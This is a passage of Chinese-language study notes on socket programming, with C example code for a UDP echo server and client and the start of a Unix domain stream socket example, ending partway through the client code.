函数一直都是阻塞的，也就是说阻塞式套接字最终发送返回的实际写入字节数和请求字节数是相等的</p></li><li><p>如果把服务端的休眠时间稍微调大，客户端打印完后服务端还在屏幕上不断打印读取数据的进度，说明发送成功仅仅表示的是数据被拷贝到了发送缓冲区中，并不意味着连接对端已经收到所有的数据</p></li></ul></li></ul><p>​</p><p>​</p><h3 id="1-6-UDP-编程">1.6 UDP 编程</h3><ul><li><p>TCP 和 UDP 相比有什么差异呢？</p><ul><li><p>UDP 是一种<strong>数据报</strong>协议，而 TCP 是一种面向连接的<strong>数据流</strong>协议</p></li><li><p>TCP 在 IP 报文的基础上，增加了诸如<strong>重传、确认、有序传输、拥塞控制</strong>等能力，通信的双方是在一个确定的上下文中工作的，而 UDP 没有这样一个确定的上下文，是一个不可靠的通信协议，没有重传、确认、有序控制、拥塞控制，也不保证报文的有效传递和有序</p></li></ul></li><li><p>UDP 程序设计时的主要过程</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210225-udp.png" alt=""></p><ul><li>服务器端创建 UDP 套接字之后，绑定到本地端口，调用 <code>recvfrom</code> 函数等待客户端的报文发送</li><li>客户端创建套接字之后，调用 <code>sendto</code> 函数往目标地址和端口发送 UDP 报文，然后客户端和服务器端进入互相应答过程</li></ul></li></ul><p>​</p><p>​</p><h4 id="主要函数">主要函数</h4><h5 id="recvfrom">recvfrom</h5><ul><li><p>函数原型</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h&gt;</span></span> ssize_t <span class="token function">recvfrom</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buff<span class="token punctuation">,</span> size_t nbytes<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">,</span> 　　　　　　　　　　<span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span>from<span class="token punctuation">,</span> socklen_t <span class="token operator">*</span>addrlen<span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>sockfd</code> 是本地创建的套接字描述符</p></li><li><p><code>buff</code> 指向本地的缓存</p></li><li><p><code>nbytes</code> 表示最大接收数据字节</p></li><li><p><code>flags</code> 是和 I/O 相关的参数</p></li><li><p><code>from</code> 和 <code>addrlen</code>，实际上是返回对端发送方的地址和端口等信息</p></li><li><p>函数返回值告诉我们实际接收的字节数</p></li></ul><blockquote><p>和 TCP 是通过 accept 函数拿到的描述字信息来决定对端的信息不一样，UDP 报文每次接收都会获取对端的信息，报文和报文之间是没有上下文的</p></blockquote></li></ul><p>​</p><h5 id="sendto">sendto</h5><ul><li><p>原型</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h&gt;</span></span> ssize_t <span class="token function">sendto</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>buff<span class="token punctuation">,</span> size_t nbytes<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">,</span>                <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span>to<span class="token punctuation">,</span> socklen_t <span class="token operator">*</span>addrlen<span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>sockfd</code> 是本地创建的套接字描述符</p></li><li><p><code>buff</code> 指向发送的缓存</p></li><li><p><code>nbytes</code> 表示发送字节数</p></li><li><p><code>to</code> 和 <code>addrlen</code>表示发送的对端地址和端口等信息</p></li><li><p>函数的返回值告诉实际接收的字节数</p></li></ul></li></ul><p>​</p><p>​</p><h4 id="实验-2">实验</h4><ul><li><p><em>udp_server.c</em>：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"lib/common.h"</span></span> <span class="token keyword">static</span> <span class="token keyword">int</span> count<span class="token punctuation">;</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">recvfrom_int</span><span class="token punctuation">(</span><span class="token keyword">int</span> signo<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nreceived %d datagrams\n"</span><span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> socket_fd<span class="token punctuation">;</span>    socket_fd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_DGRAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> server_addr<span class="token punctuation">;</span>    <span class="token function">bzero</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>server_addr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>server_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    server_addr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>    server_addr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> <span class="token function">htonl</span><span class="token punctuation">(</span>INADDR_ANY<span class="token punctuation">)</span><span class="token punctuation">;</span>    server_addr<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span>SERV_PORT<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">bind</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>server_addr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>server_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        socklen_t client_len<span class="token punctuation">;</span>    <span class="token keyword">char</span> message<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">signal</span><span class="token punctuation">(</span>SIGINT<span class="token punctuation">,</span> recvfrom_int<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 信号处理响应“Ctrl+C”退出时打印出收到的报文总数</span>        <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> client_addr<span class="token punctuation">;</span>    client_len <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>client_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 获取客户端发送的报文，加上“Hi”前缀发送给客户端</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token function">recvfrom</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> message<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>client_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>client_len<span class="token punctuation">)</span><span class="token punctuation">;</span>        message<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"received %d bytes: %s\n"</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> message<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">char</span> send_line<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span>send_line<span class="token punctuation">,</span> <span class="token string">"Hi, %s"</span><span class="token punctuation">,</span> message<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">sendto</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> send_line<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>send_line<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>client_addr<span class="token punctuation">,</span> client_len<span class="token punctuation">)</span><span class="token punctuation">;</span>                count<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>​</p><ul><li><p><em>udp_client.c</em>：从标准输入中读取输入的字符串后，发送给服务端，并且把服务端经过处理的报文打印到标准输出上</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"lib/common.h"</span></span> <span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">define</span>    <span class="token expression">MAXLINE     <span class="token number">4096</span></span></span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"usage: udpclient &lt;IPaddress&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">int</span> socket_fd<span class="token punctuation">;</span>    socket_fd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_DGRAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> server_addr<span class="token punctuation">;</span>    <span class="token function">bzero</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>server_addr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>server_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    server_addr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>    server_addr<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span>SERV_PORT<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">inet_pton</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>server_addr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>     socklen_t server_len <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>server_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span>reply_addr<span class="token punctuation">;</span>    reply_addr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>server_len<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">char</span> send_line<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">,</span> recv_line<span class="token punctuation">[</span>MAXLINE <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    socklen_t len<span class="token punctuation">;</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>     <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>send_line<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>send_line<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>send_line<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            send_line<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"now sending %s\n"</span><span class="token punctuation">,</span> send_line<span class="token punctuation">)</span><span class="token punctuation">;</span>        size_t rt <span class="token operator">=</span> <span class="token function">sendto</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> send_line<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>send_line<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>server_addr<span class="token punctuation">,</span> server_len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>rt <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"send failed "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"send bytes: %zu \n"</span><span class="token punctuation">,</span> rt<span class="token punctuation">)</span><span class="token punctuation">;</span>         len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        n <span class="token operator">=</span> <span class="token function">recvfrom</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> recv_line<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> reply_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"recvfrom failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        recv_line<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">fputs</span><span class="token punctuation">(</span>recv_line<span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>运行</p><ul><li><p>场景一：只运行客户端</p><p><img src="20210329-101753.png" alt=""></p><p>只运行客户端，程序会一直阻塞在 <code>recvfrom</code> 上</p></li><li><p>场景二：先开启服务端，再开启客户端</p><p><img src="20210329-105644.png" alt=""></p></li><li><p>场景三: 开启服务端，再一次开启两个客户端</p><p><img src="20210329-200937.png" alt="server"></p><p><img src="20210329-201010.png" alt="client"></p><p>两个客户端发送的报文依次被服务端收到，客户端也可以收到服务端处理之后的报文，如果此时把服务器端进程杀死，可以看到打印出服务器端接收到的报文个数</p><p>之后再重启服务器端进程，并使用客户端 1 和客户端 2 继续发送新的报文，服务器端可以继续收到客户端的报文（说明 UDP 报文无上下文）</p></li></ul><blockquote><p>在第一个场景中 <code>recvfrom</code> 一直处于阻塞状态中，这是非常不合理的，这种情形应该怎么处理呢？</p><p>一直阻塞会导致程序无法正常退出，可以使用接收超时、IO多路复用的<strong>超时机制</strong></p></blockquote><blockquote><p>UDP 是请求 - 应答模式的，那么请求中的 <strong>UDP 报文最大</strong>可以是多大呢？</p><p>IP和UDP头中都有16bit的长度字段，最长65535字节，去掉头部长度得到UDP数据净荷长度：65535-20-8=65507字节</p></blockquote></li></ul><p>​</p><p>​</p><h3 id="1-7-本地套接字">1.7 本地套接字</h3><p>​</p><p>​</p><h4 id="1-7-0-示例">1.7.0 示例</h4><ul><li><p>实际上本地套接字是 IPC 的一种实现方式，因为本地套接字开发便捷，接受度高，普遍适用于在同一台主机上进程间通信的各种场景</p></li><li><p>比如 Kubernetes 的 <strong>CRI</strong> <code>Container Runtime Interface</code>，其思想是将 Kubernetes 的主要逻辑和 Container Runtime 的实现解耦</p></li><li><p>kubelet 是 Kubernetes 的一个组件，负责将控制器和调度器的命令转化为单机上的容器实例，为了实现和容器运行时的解耦，kubelet 设计了基于本地套接字的客户端 - 服务器 GRPC 调用，在路径为 <em>/var/run/dockershim.socket</em> 的 stream 类型的本地套接字上可以看到开启这个套接字的进程为 kubelet（还有 docker-containerd.sock 等其他本地套接字）</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210330-kubelet.png" alt=""></p></li></ul><p>​</p><p>​</p><h4 id="1-7-1-本地套接字概述">1.7.1 本地套接字概述</h4><ul><li>本地套接字也叫做 UNIX 域套接字，是一种特殊类型的套接字，本地套接字提供了一种<strong>单主机跨进程间调用的手段</strong>，减少了协议栈实现的复杂度，效率更高</li><li>类似的 IPC 机制还有 UNIX 管道、共享内存和 RPC 调用等</li><li>本地套接字的编程接口和 IPv4、IPv6 套接字编程接口是一致的，可以支持字节流和数据报两种协议</li></ul><p>​</p><p>​</p><h4 id="1-7-2-本地字节流套接字">1.7.2 本地字节流套接字</h4><ul><li><p>示例：服务器程序打开本地套接字后，接收客户端发送来的字节流，并往客户端回送了新的字节流</p></li><li><p>服务端</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span>  <span class="token string">"lib/common.h"</span></span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"usage: unixstreamserver &lt;local_path&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">int</span> listenfd<span class="token punctuation">,</span> connfd<span class="token punctuation">;</span>    socklen_t clilen<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">sockaddr_un</span> cliaddr<span class="token punctuation">,</span> servaddr<span class="token punctuation">;</span>     listenfd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_LOCAL<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>listenfd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"socket create failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token comment">// 创建一个本地地址</span>    <span class="token keyword">char</span> <span class="token operator">*</span>local_path <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span>local_path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// unlink 把存在的文件删除以保持幂等性</span>    <span class="token function">bzero</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>servaddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    servaddr<span class="token punctuation">.</span>sun_family <span class="token operator">=</span> AF_LOCAL<span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">.</span>sun_path<span class="token punctuation">,</span> local_path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 设置本地文件路径</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">bind</span><span class="token punctuation">(</span>listenfd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>servaddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"bind failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">listen</span><span class="token punctuation">(</span>listenfd<span class="token punctuation">,</span> LISTENQ<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"listen failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     clilen <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>cliaddr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>connfd <span class="token operator">=</span> <span class="token function">accept</span><span class="token punctuation">(</span>listenfd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>cliaddr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>clilen<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>errno <span class="token operator">==</span> EINTR<span class="token punctuation">)</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"accept failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* back to for() */</span>        <span class="token keyword">else</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"accept failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">char</span> buf<span class="token punctuation">[</span>BUFFER_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 使用 read 和 write 从套接字中按照字节流的方式读取和发送数据</span>        <span class="token function">bzero</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>connfd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> BUFFER_SIZE<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"client quit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Receive: %s"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">char</span> send_line<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span>send_line<span class="token punctuation">,</span> <span class="token string">"Hi, %s"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">int</span> nbytes <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>send_line<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>connfd<span class="token punctuation">,</span> send_line<span class="token punctuation">,</span> nbytes<span class="token punctuation">)</span> <span class="token operator">!=</span> nbytes<span class="token punctuation">)</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"write error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token function">close</span><span class="token punctuation">(</span>listenfd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>connfd<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>本地字节流套接字识别服务器不再通过 IP 地址和端口，而是通过本地文件</li><li>本地文件路径应该是绝对路径，这样的话编写好的程序可以在任何目录里被启动和管理，如果是相对路径，这个程序的启动路径就必须固定，对程序的管理反而是一个很大的负担</li><li>如果文件不存在，bind 时会自动创建这个文件</li></ul></li><li><p>客户端</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"lib/common.h"</span></span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token 